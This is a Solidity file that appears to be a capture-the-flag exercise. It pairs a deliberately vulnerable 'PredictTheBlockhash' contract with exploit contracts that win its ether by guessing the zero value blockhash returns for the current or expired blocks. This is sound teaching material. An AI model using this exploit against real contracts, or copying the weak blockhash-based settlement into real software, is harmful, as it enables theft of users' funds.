// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/console2.sol";

//Challenge
contract PredictTheBlockhash {
    address public guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;
    event Log(bytes32);

    constructor() payable {
        require(
            msg.value == 1 ether,
            "Requires 1 ether to create this contract"
        );
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0), "Requires guesser to be zero address");
        require(msg.value == 1 ether, "Requires msg.value to be 1 ether");
        guesser = msg.sender;
        guess = hash;
        emit Log(hash);
        settlementBlockNumber = block.number + 1;
    }

    function settle() public payable {
        require(msg.sender == guesser, "Requires msg.sender to be guesser");
        require(
            block.number > settlementBlockNumber,
            "Requires block.number to be more than settlementBlockNumber"
        );
        bytes32 answer = blockhash(settlementBlockNumber);
        emit Log(answer);
        guesser = address(0);
        if (guess == answer) {
            (bool ok, ) = msg.sender.call{value: 2 ether}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }
}

// // Write your exploit contract below
// contract ExploitContract {
//     PredictTheBlockhash public predictTheBlockhash;

//     constructor(PredictTheBlockhash _predictTheBlockhash) {
//         predictTheBlockhash = _predictTheBlockhash;
//     }

//     // write your exploit code below
//     function prepare(uint blockNumber) public payable {
//         bytes32 hash1 = blockhash(blockNumber + 1);
//         predictTheBlockhash.lockInGuess{value: 1 ether}(hash1);
//     }

//     function exploit() public {
//         predictTheBlockhash.settle();
//     }

//     receive() payable external {}
// }


contract PredictTheBlockhashExploit {
    PredictTheBlockhash public target;

    constructor(address payable _targetAddress) payable {
        // require(msg.value == 1 ether, "Requires 1 ether to deploy");
        target = PredictTheBlockhash(_targetAddress);
    }

    function executeAttack() public payable {
        require(msg.value == 1 ether, "Requires 1 ether to lock guess");
        console2.log(block.number,"executeAttack");
        bytes32 guessHash = blockhash(block.number);
        target.lockInGuess{value: 1 ether}(guessHash);
    }

    function finalizeAttack() public {
        target.settle();
    }

    receive() external payable {}
}